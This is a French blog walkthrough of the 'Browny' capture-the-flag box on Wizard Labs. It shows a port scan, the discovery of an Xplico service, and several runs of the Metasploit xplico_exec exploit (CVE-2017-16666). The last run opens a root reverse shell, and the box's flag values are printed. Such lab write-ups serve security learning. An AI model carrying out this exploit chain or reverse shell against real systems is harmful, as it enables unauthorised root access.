# Solution du CTF Browny de Wizard-Labs

Chocoooooo
----------

*Browny* est un CTF de la plateforme *Wizard Labs*. Cette box donnée à une difficulté très faible (1/10) est basée sur Linux.  

On peut lancer un masscan pour lister les ports en écoute :  

```plain
$ sudo masscan -i tun0 -p1-65535 --rate 100 10.1.1.17

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-23 14:32:37 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.1.1.17                                       
Discovered open port 9876/tcp on 10.1.1.17                                     
Discovered open port 30005/tcp on 10.1.1.17                                    
Discovered open port 30001/tcp on 10.1.1.17                                    
Discovered open port 22/tcp on 10.1.1.17                                       
Discovered open port 30004/tcp on 10.1.1.17                                    
Discovered open port 30003/tcp on 10.1.1.17                                    
Discovered open port 30002/tcp on 10.1.1.17
```

On peut ensuite récupérer cet output pour extraire la liste des ports et les rebalancer avec Nmap. La commande suite va formater cette liste de ports en les séparant avec des virgules :  

```bash
$ grep Disco output.txt | cut -d' ' -f4| cut -d/ -f1 |paste -d ',' -s
80,9876,30005,30001,22,30004,30003,30002
```

En fouillant sur le port 80 avec un dirbuster on ne découvre ni dossier ni script PHP :(  

En revanche le service en écoute sur le port 9876, anoncé par Nmap comme un *Apache Hadoop* est en réalité un [Xplico](https://www.xplico.org/) qui est une appli web pour l'analyse forensics réseau.  

On passe ainsi un fichier PCAP et on peut l'explorer via *Xplico*. J'avais déjà utilisé ce soft qui est assez agréable d'utilisation.  

Bien sûr ici on est principalement intéressés par les vulnérabilités du logiciel plutôt que ses fonctionnalités.  

Metasploit dispose d'un module d'attaque dont voici la description et les payloads possibles :  

```plain
Description:
  This module exploits command injection vulnerability. 
  Unauthenticated users can register a new account and then execute a 
  terminal command under the context of the root user. The specific 
  flaw exists within the Xplico, which listens on TCP port 9876 by 
  default.

Compatible Payloads
===================

   Name                     Disclosure Date  Rank    Check  Description
   ----                     ---------------  ----    -----  -----------
   cmd/unix/bind_awk                         normal  No     Unix Command Shell, Bind TCP (via AWK)
   cmd/unix/bind_netcat                      normal  No     Unix Command Shell, Bind TCP (via netcat)
   cmd/unix/generic                          normal  No     Unix Command, Generic Command Execution
   cmd/unix/reverse_awk                      normal  No     Unix Command Shell, Reverse TCP (via AWK)
   cmd/unix/reverse_netcat                   normal  No     Unix Command Shell, Reverse TCP (via netcat)
```

L'exploitation n'a pas été à la hauteur de nos espérances :  

```plain
msf5 exploit(linux/http/xplico_exec) > run

[*] Started reverse TCP handler on 10.254.0.29:4444 
[*] Initiating new session on server side
[*] Registering a new user
[+] New user successfully registered
[*] Username: metnhsrpiveb
[*] Password: igMHipqNbEwaFoBVDqYFPXXQbEkIBCZV
[*] Calculating em_key code of the user
[*] Activating user with em_key = 3ad86d0ada1f91ab6357ca774ad0c2bf
[-] Exploit aborted due to failure: unknown: Could not activated our user. Target may not be vulnerable.
[*] Exploit completed, but no session was created.
```

Il est temps de ce pencher plus sur les détails de la vulnérabilité pour déterminer ce qui cloche.  

[L'article original](https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/) traitant de la faille mentionne une variable qu'il faut plus ou moins deviner car elle correspond au temps Unix et est utilisée pour réussir l'exploitation.  

L'exploit utilise donc le temps qu'il croit être juste... en gros il faut que toute l'exploitation se fasse dans une fenêtre d'une seconde pour ne pas être embêté :p  

Du coup c'est principalement le manque de chance... bref on relance jusqu'à ce que...  

```plain
[*] Started reverse TCP handler on 10.254.0.29:4444 
[*] Initiating new session on server side
[*] Registering a new user
[+] New user successfully registered
[*] Username: svfzydcg
[*] Password: apywpCMpmUjHBHhHnHRzIAMuNJNggYWZ
[*] Calculating em_key code of the user
[*] Activating user with em_key = 2edb880cb905936ab894e54db23abe18
[+] User successfully activated
[*] Authenticating with our activated new user
[+] Successfully authenticated
[*] Creating new case
[+] New Case successfully creted. Our pol_id = 7
[*] Creating new xplico session for pcap
[+] New Sols successfully creted. Our sol_id = 7
[*] Uploading malformed PCAP file
[+] PCAP successfully uploaded. Pcap parser is going to start on server side.
[*] Parsing has started. Wait for parser to get the job done...
[*] Exploit completed, but no session was created.
```

C'est mieux mais ça n'aboutit toujours pas. Il s'est avéré que l'upload des fichiers ne fonctionnait plus sur la machine pour une raison inconnue. Un reset de la machine plus tard :  

```plain
msf5 exploit(linux/http/xplico_exec) > run

[*] Started reverse TCP handler on 10.254.0.29:4444
[*] Initiating new session on server side
[*] Registering a new user
[+] New user successfully registered
[*] Username: qvxtanwgruta
[*] Password: KjixXsyUFbhjRiBSITzWbDjciGBsJrOP
[*] Calculating em_key code of the user
[*] Activating user with em_key = 027c6641ad1e36ebddf3ee5cb384e6a7
[+] User successfully activated
[*] Authenticating with our activated new user
[+] Successfully authenticated
[*] Creating new case
[+] New Case successfully creted. Our pol_id = 5
[*] Creating new xplico session for pcap
[+] New Sols successfully creted. Our sol_id = 5
[*] Uploading malformed PCAP file
[+] PCAP successfully uploaded. Pcap parser is going to start on server side.
[*] Parsing has started. Wait for parser to get the job done...
[+] We are at PCAP decoding phase. Little bit more patience...
[+] We are at PCAP decoding phase. Little bit more patience...
[+] We are at PCAP decoding phase. Little bit more patience...
[*] Command shell session 1 opened (10.254.0.29:4444 -> 10.1.1.17:57091) at 2019-02-23 16:33:59 +0100

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/opt/xplico/bin
cd /root
ls
root.txt
cat root.txt
02240138a64d38ed22526a4a0f1ea9a1
ls /home
granit
cd /home/granit
cat user.txt
c553f25184be6a0e81be6cfc000d5b20
```

CTF parfait pour le 4h.  


*Published May 21 2019 at 18 05*